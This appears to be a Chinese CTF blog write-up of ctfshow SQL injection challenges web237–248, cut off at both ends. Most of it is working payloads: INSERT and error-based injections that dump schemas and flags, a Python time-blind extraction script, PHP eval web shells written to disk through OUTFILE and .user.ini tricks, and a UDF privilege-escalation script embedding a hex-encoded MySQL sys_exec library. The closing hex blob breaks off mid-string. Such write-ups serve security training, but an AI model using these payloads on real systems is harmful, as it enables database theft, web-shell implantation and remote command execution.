</span></span></span></code></pre></td></tr></table></div></div><p><code>insert</code>注入来插入数据，一个注意的点就是不能覆盖数据，而且要多写个括号来闭合前面的<code>value</code>后面的<code>(</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=1&#39;,(select group_concat(schema_name) from information_schema.schemata))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=2&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=3&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=3&#39;,(select flagass23s3 from flag))#&amp;password=
</span></span></code></pre></td></tr></table></div></div><h2 id=web238>web238</h2><p>过滤了空格</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=2&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=2&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;flagb&#39;))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=3&#39;,(select(group_concat(flag))from(ctfshow_web.flagb))#&amp;password=
</span></span></code></pre></td></tr></table></div></div><h2 id=web239>web239</h2><p>抽象的是不能用注释绕过<code>/**/</code>只能用括号，<code>sys.schema_table_statistics_with_buffer</code>也不能使用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=5&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)=database()))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=6&#39;,((select(b)from(select(1),(2)as(b),(3)union(select(flagbb)limit(0),(1)))a)))#&amp;password=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=6&#39;,(select(group_concat(flag))from(ctfshow_web.flagbb)))#&amp;password=
</span></span></code></pre></td></tr></table></div></div><p>无列名注入也不能成功，直接猜flag</p><h2 id=web240>web240</h2><p>爆破一下即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://62418365-713b-4401-b5bf-514ffc6611f5.challenge.ctf.show/api/insert.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>a1</span> <span class=ow>in</span> <span class=s2>&#34;ab&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>a2</span> <span class=ow>in</span> <span class=s2>&#34;ab&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>a3</span> <span class=ow>in</span> <span class=s2>&#34;ab&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>a4</span> <span class=ow>in</span> <span class=s2>&#34;ab&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>a5</span> <span class=ow>in</span> <span class=s2>&#34;ab&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>payload</span><span class=o>=</span><span class=s1>&#39;flag&#39;</span><span class=o>+</span><span class=n>a1</span><span class=o>+</span><span class=n>a2</span><span class=o>+</span><span class=n>a3</span><span class=o>+</span><span class=n>a4</span><span class=o>+</span><span class=n>a5</span>
</span></span><span class=line><span class=cl>                    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;username&#39;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;1&#39;,(select(flag)from(</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>)))#&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;password&#39;</span><span class=p>:</span><span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web241>web241</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=err>$</span><span class=k>sql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s2>&#34;delete from  ctfshow_user where id = {$id}&#34;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><code>delete</code>语句本身不会返回数据，所以我们这里需要进行时间盲注</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://027f52d9-f4d4-400e-abcb-55d154d072e5.challenge.ctf.show/api/delete.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span> <span class=o>=</span> <span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=o>=</span><span class=s2>&#34;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>&lt;</span> <span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;if((ascii(substr((select database()),{0},1)))&lt;{1},{2},0)#&#34;.format(i,mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># banlist,ctfshow_user,flag</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid, sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flag</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if((ascii(substr((select flag from flag),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,</span><span class=si>{2}</span><span class=s2>,0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span> <span class=p>,</span><span class=n>sleep</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span> <span class=o>&gt;</span> <span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span> <span class=o>!=</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web242>web242</h2><p>使用<code>lines terminated by\lines starting by\FIELDS TERMINATED BY\COLUMNS terminated by</code>插入恶意webshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=1.php&#39; FIELDS TERMINATED BY &#39;&lt;?php eval($_POST[1]); ?&gt;&#39;;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>filename=3.php&#39; lines starting by &#39;&lt;?php eval($_POST[1]); ?&gt;&#39;;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>filename=4.php&#39; lines terminated by &#39;&lt;?php eval($_POST[1]); ?&gt;&#39;;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>filename=8.php&#39; COLUMNS terminated by &#39;&lt;?php eval($_POST[1]); ?&gt;&#39;;#
</span></span></code></pre></td></tr></table></div></div><h2 id=web243>web243</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=.user.ini&#39; lines starting by &#39;auto_prepend_file=1.txt\n&#39;#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>filename=1.txt&#39; lines starting by &#39;&lt;?= eval($_POST[1]);?&gt;&#39;#
</span></span></code></pre></td></tr></table></div></div><p>访问<code>/demp/</code>即可getshell</p><p><img src=/p/ctfshow-sql-injection/QQ20250502-171712.jpg width=1260 height=376 loading=lazy alt=1></p><h2 id=web244>web244</h2><p>报错注入开始，<code>updatexml\extractvalue</code>，关键词的区别是<code>extractvalue(1,(查询语句))</code>和<code>updatexml(1,(查询语句),1)</code>，注意括号就好了，路由为<code>/api/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?id=1&#39; or updatexml(1,concat(0x3d,mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x3d),1)--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or updatexml(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),1,32),0x3d),1)--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or updatexml(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flag&#39;),1,32),0x3d),1)--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),1,32),0x3d),1)--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),32,32),0x3d),1)--+
</span></span></code></pre></td></tr></table></div></div><h2 id=web245>web245</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?id=1&#39; or extractvalue(1,concat(0x3d,mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x3d))--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or extractvalue(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),1,32),0x3d))--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or extractvalue(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;),1,32),0x3d))--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),1,32),0x3d))--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),32,32),0x3d))--+
</span></span></code></pre></td></tr></table></div></div><h2 id=web246>web246</h2><p>报错原理：</p><ol><li>MySQL 在执行 GROUP BY 时，会为每个不同的 group 创建一个临时表</li><li><code>rand()</code> 会在查询执行过程中多次计算，而不是只计算一次</li><li>当 <code>rand()</code> 生成的值导致重复的键值出现时，MySQL 试图插入重复键到临时表时会产生错误</li></ol><p>所以有时候运气不好需要发好几次包才能成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat((select schema_name from information_schema.schemata limit 4,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
</span></span></code></pre></td></tr></table></div></div><p><code>limit\mid\right\left\substring</code>都是一样的其实，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flags&#39;),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select group_concat(flag2) from ctfshow_flags),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
</span></span></code></pre></td></tr></table></div></div><h2 id=web247>web247</h2><blockquote><p>ceil()-向上取整函数
ceil(x) 返回不小于 x 的最小整数，即向上取整。
例如，ceil(3.14) 返回 4。</p><p>round() - 四舍五入函数
round(x) 返回最接近 x 的整数，如果有两个整数与 x 距离相等，则返回偶数的整数。
例如，round(3.6) 返回 4，round(3.5) 返回 4，round(3.4) 返回 3。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?id=1&#39; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,round(rand()*2))a from information_schema.tables group by a--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
</span></span></code></pre></td></tr></table></div></div><p>正常写就行，最后一句有个小细节<code>flag?</code>要正确解析需要使用反引号</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select `flag?` from ctfshow_flagsa),1,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/api/?id=1&#39; union select 1,count(*),concat(mid((select `flag?` from ctfshow_flagsa),32,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
</span></span></code></pre></td></tr></table></div></div><h2 id=web248>web248</h2><p>UDF提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 参考脚本</span>
</span></span><span class=line><span class=cl><span class=c1># 环境：Linux/MariaDB</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://1149521a-f0ba-48c5-adc6-4d6733e6a62e.challenge.ctf.show/api/?id=&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=s1>&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955